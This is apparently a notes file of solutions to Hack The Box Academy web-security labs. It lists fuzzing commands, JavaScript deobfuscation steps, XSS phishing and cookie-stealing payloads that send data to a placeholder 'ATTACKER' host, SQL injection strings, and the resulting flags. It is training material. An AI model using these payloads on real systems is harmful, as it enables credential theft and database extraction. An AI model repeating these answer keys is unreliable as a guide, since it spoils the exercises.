# HTB Academy - Web Fuzzing: Parameter and Value Fuzzing (Optional Exercise 1)

Target: http://154.57.164.79:34341

## POST parameter fuzzing
Endpoint: /post.php  (POST param `y`)
Empty POST -> "Incorrect parameter value y:" (404)

ffuf command:
  ffuf -u http://154.57.164.79:34341/post.php -X POST \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v

Valid value: SUNWmc  (returns HTTP 200)
Verify:
  curl -d "y=SUNWmc" http://154.57.164.79:34341/post.php

### ANSWER (POST): HTB{p0st_fuzz1ng_succ3ss}

## GET parameter fuzzing (related)
  curl "http://154.57.164.79:34341/get.php?x=OA_HTML"
  ANSWER (GET): HTB{g3t_fuzz1ng_succ3ss}

---
# Question 1 (target 154.57.164.74:32459)

Fuzz with DirBuster-2007_directory-list-2.3-medium.txt to find hidden dir,
then read the tar.gz inside and answer with the Content-Length header.

Hidden dir: /ur-hiddenmember/
File:       /ur-hiddenmember/backup.tar.gz

  curl -I http://154.57.164.74:32459/ur-hiddenmember/backup.tar.gz
  # Content-Length: 210

### ANSWER: Content-Length: 210

---
# Question 1 (target 154.57.164.69:32117) - API Fuzzing
Endpoint identified: /czcmdcvt
  curl http://154.57.164.69:32117/czcmdcvt
  -> {"flag":"h1dd3n_r357"}
ANSWER: h1dd3n_r357

---
# Web Fuzzing Skills Assessment (target 154.57.164.75:43303)
/admin/panel.php?accessID=getaccess -> hints fuzzing_fun.htb vhost
vhost hidden.fuzzing_fun.htb -> /godeep/stoneedge/bbclone/typo3/index.php
  curl -H "Host: hidden.fuzzing_fun.htb" http://154.57.164.75:43303/godeep/stoneedge/bbclone/typo3/index.php
  -> HTB{w3b_fuzz1ng_sk1lls}
ANSWER: HTB{w3b_fuzz1ng_sk1lls}

---
# JavaScript Deobfuscation (target 154.57.164.78:38110)
curl http://154.57.164.78:38110/ -> HTML source comment: <!-- HTB{4lw4y5_r34d_7h3_50urc3} -->
ANSWER: HTB{4lw4y5_r34d_7h3_50urc3}

---
# JS Deobfuscation (target 154.57.164.78:38110) - secret.js
Packer-decoded:
function generateSerial(){var flag="HTB{1_4m_7h3_53r14l_g3n3r470r!}";var xhr=new XMLHttpRequest();var url="/serial.php";xhr.open("POST",url,true);xhr.send(null)}
ANSWER: HTB{1_4m_7h3_53r14l_g3n3r470r!}

---
# JS Deobfuscation (target 154.57.164.78:38110) - POST /serial.php
curl -X POST http://154.57.164.78:38110/serial.php -> N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz
base64 -d -> 7h15_15_a_s3cr37_m3554g3
ANSWER: 7h15_15_a_s3cr37_m3554g3

# CORRECTION: Question asks for the RAW response, not the decoded value.
# Expected answer: N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz
# (Decoded 7h15_15_a_s3cr37_m3554g3 is used as input for the NEXT question.)

---
# JS Deobfuscation - serial.php with decoded output
curl -X POST http://154.57.164.78:38110/serial.php -d "serial=7h15_15_a_s3cr37_m3554g3"
-> HTB{ju57_4n07h3r_r4nd0m_53r14l}
ANSWER: HTB{ju57_4n07h3r_r4nd0m_53r14l}

---
# JavaScript Deobfuscation - SKILL ASSESSMENT (target 154.57.164.79:32623)
Q1 (JS file name): api.min.js
Q2 (run the JS -> console output): HTB{j4v45cr1p7_3num3r4710n_15_k3y}
Q3 (deobfuscate -> flag variable): HTB{n3v3r_run_0bfu5c473d_c0d3!}
Q4 (POST /keys.php -> secret key): 4150495f70336e5f37333537316e365f31355f66756e
Q5 (decode hex -> API_p3n_73571n6_15_fun; POST key=...): HTB{r34dy_70_h4ck_my_w4y_1n_2_HTB}

---
# XSS module (target 154.57.164.74:40229)
GET / -> Set-Cookie: cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}
(XSS payload alert(document.cookie) would show this cookie value)
ANSWER: HTB{570r3d_f0r_3v3ry0n3_70_533}

---
# XSS module (target 154.57.164.81:44289)
GET / -> Set-Cookie: cookie=HTB{r3fl3c73d_b4ck_2_m3}
ANSWER: HTB{r3fl3c73d_b4ck_2_m3}

---
# XSS module (target 154.57.164.76:43131) - cookie set via JS
Inline script: eval(atob("ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5sZVY5amJERXpiamRmTlRGa00zMD0nKTs="))
-> document.cookie = atob('SFRCe3B1cjNleV9jbDEzbjdfNTFkM30=')
decoded cookie value: HTB{pur3ey_cl13n7_51d3}
ANSWER: HTB{pur3ey_cl13n7_51d3}

# CORRECTION: value = HTB{pur3ly_cl13n7_51d3} ("purely client side")

---
# XSS Attacks - XSS Discovery exercise (target 154.57.164.65:37488)
Registration form (GET): fullname, username, password, email
Reflection confirmed in the EMAIL parameter:
  curl "http://154.57.164.65:37488/?fullname=x&username=x&password=x&email=<script>alert(1)</script>" -> reflected unescaped
Q1 vulnerable parameter: email
Q2 type of XSS: Reflected

---
# XSS Phishing exercise (target 10.129.234.166 /phishing) [HTB VPN - not reachable from sandbox]
Injection point: /phishing/index.php?url= rendered into <img src='URL'>
Payload: '><h3>Please login to continue</h3><form action=http://ATTACKER><input name=username><input name=password><input type=submit></form><script>document.getElementById('urlform').remove()</script><!--
Victim creds captured: admin : p1zd0nt57341myp455
Login at /phishing/login.php -> flag
ANSWER: HTB{r3f13c73d_cr3d5_84ck_2_m3}

---
# XSS Session Hijacking exercise (target 10.129.234.166) [HTB VPN]
Vulnerable field: Profile picture URL; payload: "><script src=http://ATTACKER/script.js></script>
script.js: new Image().src='http://ATTACKER/index.php?c='+document.cookie;
Stolen admin cookie: cookie=c00k1355h0u1d8353cu23d
Use cookie at /hijacking/login.php -> flag
ANSWER: HTB{4lw4y5_53cur3_y0ur_c00k135}

---
# XSS Skills Assessment (target 10.129.234.166 /assessment) [HTB VPN]
Q: What is the value of the flag cookie?
Vulnerable field: comment Website input. Payload:
  "><script>new Image().src='http://ATTACKER/catch?c='+document.cookie;</script>
Captured: ...flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
ANSWER: HTB{cr055_5173_5cr1p71n6_n1nj4}

---
# SQLMap Essentials - Cases (target 154.57.164.79:40261)
All queries: 9-col table (case2/3), 6-col (case4). DB tables flagN have columns (id, content).

## Case 2 - POST parameter id
curl -X POST http://154.57.164.79:40261/case2.php --data-urlencode "id=0 union select 1,2,3,4,5,6,7,8,(select content from flag2)"
ANSWER flag2: HTB{700_much_c0n6r475_0n_p057_r3qu357}

## Case 3 - Cookie value id
curl -b "id=0 union select 1,2,3,4,5,6,7,8,(select content from flag3)" http://154.57.164.79:40261/case3.php
ANSWER flag3: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

## Case 4 - JSON body {"id": "..."}  (value inserted UNQUOTED)
printf '{"id":"0 union select 1,2,3,4,5,(select content from flag4)"}' > /tmp/c4.json
curl -X POST http://154.57.164.79:40261/case4.php -H 'Content-Type: application/json' --data-binary @/tmp/c4.json
ANSWER flag4: HTB{j450n_v00rh335_53nd5_6r475}

---
# SQLMap Essentials - Attack Tuning Cases 5/6/7 (target 154.57.164.79:40261)

## Case 5 (GET id, OR boolean/time-based blind)
TRUE test: id=1 OR 1=1 -> 32 rows. Leak via boolean subquery:
  id=1 OR (select substring(content,8,1) from flag5)=0x5f  -> 32 rows (true)
ANSWER flag5: HTB{700_much_r15k_bu7_w0r7h_17}

## Case 6 (GET col, non-standard boundaries = value wrapped in backticks: id = `$col`)
Boolean leak:
  col=id`=`id` AND 1=1 AND `id`=`id                -> 32 rows (true)
  col=id`=`id` AND (select content from flag6)=0x<hex> AND `id`=`id -> 32 rows
ANSWER flag6: HTB{v1nc3_mcm4h0n_15_4570n15h3d}

## Case 7 (GET id, UNION, 5 columns)
  id=0 union select 1,2,3,4,(select content from flag7)
ANSWER flag7: HTB{un173_7h3_un173d}

---
# SQLMap Essentials Case 1 (target 154.57.164.79:40261) - GET id, UNION (6 cols)
curl ".../case1.php?id=0 union select 1,2,3,4,5,(select content from flag1)"
ANSWER flag1: HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}
